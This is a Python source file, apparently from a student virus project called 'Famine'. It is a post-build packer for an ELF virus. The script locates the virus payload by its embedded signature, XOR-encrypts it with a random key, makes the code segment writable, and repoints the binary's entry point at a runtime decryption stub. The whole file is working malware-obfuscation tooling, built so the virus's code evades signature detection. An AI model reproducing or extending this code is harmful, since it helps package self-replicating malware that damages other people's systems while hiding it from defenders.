#!/usr/bin/env python3
"""
Obfuscation tool for Famine virus
This script encrypts the virus payload section using XOR encryption.
The decryption stub is already in the ASM code.
"""

import sys
import os
import struct
import random

def generate_key(length=16):
    """Generate a random XOR key"""
    return bytes([random.randint(1, 255) for _ in range(length)])

def find_xor_key_offset(binary_data):
    """
    Find the XOR key in the binary by looking for the default key pattern
    """
    # Default key from ASM: 0x13, 0x37, 0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE
    default_key = b'\x13\x37\xDE\xAD\xBE\xEF\xCA\xFE\xBA\xBE\xF0\x0D\xC0\xDE\xFA\xCE'
    
    pos = binary_data.find(default_key)
    return pos

def find_encrypted_size_offset(binary_data, key_offset):
    """
    Find the encrypted_size field (8 bytes after the 16-byte key)
    """
    if key_offset is None or key_offset < 0:
        return None
    return key_offset + 16

def find_encrypt_section_start(binary_data, size_offset):
    """
    The encryption section starts 8 bytes after the size field
    """
    if size_offset is None or size_offset < 0:
        return None
    return size_offset + 8


def find_virus_end(binary_data, start_offset):
    """
    Find the end of the virus section.
    Look for patterns that indicate the end of virus code.
    """
    # Search for the signature which is embedded in the virus
    signature = b"Famine version 1.0 (c)oded by <ocrossi>-<elaignel>"
    
    sig_pos = binary_data.find(signature, start_offset)
    if sig_pos != -1:
        # virus_end is shortly after the signature and its length byte
        # Add buffer for remaining code (virus functions)
        return sig_pos + len(signature) + 4000
    
    # Fallback: use a reasonable max size
    return start_offset + 16384

def xor_encrypt(data, key):
    """XOR encrypt/decrypt data with key (key is repeated as needed)"""
    result = bytearray()
    key_len = len(key)
    for i, byte in enumerate(data):
        result.append(byte ^ key[i % key_len])
    return bytes(result)

def patch_text_segment_writable(binary_data):
    """
    Patch the ELF program headers to make the .text segment writable.
    This is necessary for self-modifying code.
    """
    # ELF64 header is 64 bytes
    # Program header table offset is at offset 32 (8 bytes)
    phoff = struct.unpack('<Q', binary_data[32:40])[0]
    
    # Program header entry size is at offset 54 (2 bytes)
    phentsize = struct.unpack('<H', binary_data[54:56])[0]
    
    # Number of program headers is at offset 56 (2 bytes)
    phnum = struct.unpack('<H', binary_data[56:58])[0]
    
    print(f"[*] ELF Program Headers: {phnum} entries at offset 0x{phoff:x}")
    
    # Iterate through program headers
    for i in range(phnum):
        ph_offset = phoff + i * phentsize
        
        # Program header structure (64-bit):
        # Offset 0: p_type (4 bytes)
        # Offset 4: p_flags (4 bytes)
        # Offset 8: p_offset (8 bytes)
        # ...
        
        p_type = struct.unpack('<I', binary_data[ph_offset:ph_offset+4])[0]
        p_flags = struct.unpack('<I', binary_data[ph_offset+4:ph_offset+8])[0]
        p_offset = struct.unpack('<Q', binary_data[ph_offset+8:ph_offset+16])[0]
        
        # PT_LOAD = 1
        if p_type == 1:
            # Check if this is the .text segment (executable flag set)
            PF_X = 1
            PF_W = 2
            PF_R = 4
            
            if p_flags & PF_X:  # Executable segment
                # Add write permission
                new_flags = p_flags | PF_W
                print(f"[*] Found .text segment at file offset 0x{p_offset:x}")
                print(f"[*] Changing flags from 0x{p_flags:x} (R E) to 0x{new_flags:x} (RWE)")
                
                # Patch the flags
                binary_data[ph_offset+4:ph_offset+8] = struct.pack('<I', new_flags)
    
    return binary_data

def patch_entry_point_to_virus_start(binary_data):
    """
    Patch the ELF entry point to point to virus_start instead of _start.
    This is necessary so the decryption stub runs before the encrypted code.
    """
    # The entry point is at offset 24 (8 bytes) in the ELF header
    entry_point = struct.unpack('<Q', binary_data[24:32])[0]
    print(f"[*] Current entry point: 0x{entry_point:x}")
    
    # Find virus_start by looking for the decryption stub pattern
    # The stub starts with: call <next>; pop rax
    # Machine code: e8 00 00 00 00 58 (call with 0 offset, then pop rax)
    stub_pattern = b'\xe8\x00\x00\x00\x00\x58'
    
    # Search in the .text section (starting from file offset 0x1000)
    text_offset = 0x1000
    search_start = text_offset
    search_end = min(text_offset + 0x2000, len(binary_data))
    
    pos = binary_data.find(stub_pattern, search_start, search_end)
    if pos == -1:
        print("[!] Could not find decryption stub pattern")
        return binary_data
    
    # virus_start is at this position
    # Calculate the virtual address
    # File offset relative to .text start: pos - 0x1000
    # Virtual address: 0x401000 + (pos - 0x1000) = 0x400000 + pos
    new_entry = 0x400000 + pos
    
    print(f"[*] Found decryption stub at file offset: 0x{pos:x}")
    print(f"[*] Updating entry point to: 0x{new_entry:x}")
    
    # Patch the entry point
    binary_data[24:32] = struct.pack('<Q', new_entry)
    
    return binary_data

def obfuscate_binary(input_path, output_path):
    """
    Main obfuscation function.
    Finds the markers in the binary and encrypts the section between them.
    """
    
    print(f"[*] Reading binary: {input_path}")
    with open(input_path, 'rb') as f:
        binary_data = bytearray(f.read())
    
    original_size = len(binary_data)
    print(f"[*] Binary size: {original_size} bytes")
    
    # Patch the .text segment to be writable (needed for self-modifying code)
    binary_data = patch_text_segment_writable(binary_data)
    
    # Patch the entry point to virus_start
    binary_data = patch_entry_point_to_virus_start(binary_data)
    
    # Find the XOR key location
    key_offset = find_xor_key_offset(binary_data)
    if key_offset is None:
        print("[!] Could not find XOR key marker in binary")
        print("[!] Make sure the binary was compiled with the obfuscation stub")
        sys.exit(1)
    
    print(f"[*] Found XOR key at offset: 0x{key_offset:x}")
    
    # Find encrypted_size field
    size_offset = find_encrypted_size_offset(binary_data, key_offset)
    print(f"[*] Encrypted size field at offset: 0x{size_offset:x}")
    
    # Find encryption section start
    encrypt_start = find_encrypt_section_start(binary_data, size_offset)
    print(f"[*] Encryption section starts at offset: 0x{encrypt_start:x}")
    
    # Find encryption section end (virus_end)
    encrypt_end = find_virus_end(binary_data, encrypt_start)
    print(f"[*] Encryption section ends at offset: 0x{encrypt_end:x}")
    
    # Calculate section size
    section_size = encrypt_end - encrypt_start
    print(f"[*] Section to encrypt: {section_size} bytes (0x{section_size:x})")
    
    if section_size <= 0 or section_size > 32768:
        print(f"[!] Invalid section size: {section_size}")
        sys.exit(1)
    
    # Extract the section to encrypt
    section_to_encrypt = binary_data[encrypt_start:encrypt_end]
    
    # Generate new random XOR key
    new_key = generate_key(16)
    print(f"[*] Generated new XOR key: {new_key.hex()}")
    
    # Encrypt the section
    encrypted_section = xor_encrypt(section_to_encrypt, new_key)
    print(f"[*] Section encrypted successfully")
    
    # Update the binary:
    # 1. Replace the XOR key
    binary_data[key_offset:key_offset+16] = new_key
    print(f"[*] Updated XOR key in binary")
    
    # 2. Update the encrypted_size field
    binary_data[size_offset:size_offset+8] = struct.pack('<Q', section_size)
    print(f"[*] Updated encrypted_size field: {section_size}")
    
    # 3. Replace the section with encrypted version
    binary_data[encrypt_start:encrypt_end] = encrypted_section
    print(f"[*] Replaced section with encrypted version")
    
    # Verify size hasn't changed
    if len(binary_data) != original_size:
        print(f"[!] Warning: Binary size changed from {original_size} to {len(binary_data)}")
    
    # Write output
    print(f"[*] Writing obfuscated binary: {output_path}")
    with open(output_path, 'wb') as f:
        f.write(binary_data)
    
    # Make executable
    os.chmod(output_path, 0o755)
    
    print(f"[+] Obfuscation complete!")
    print(f"[+] Encrypted {section_size} bytes using XOR key: {new_key.hex()}")
    print(f"[+] The decryption stub will automatically decrypt at runtime")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <input_binary> <output_binary>")
        sys.exit(1)
    
    input_binary = sys.argv[1]
    output_binary = sys.argv[2]
    
    if not os.path.exists(input_binary):
        print(f"[!] Input binary not found: {input_binary}")
        sys.exit(1)
    
    obfuscate_binary(input_binary, output_binary)

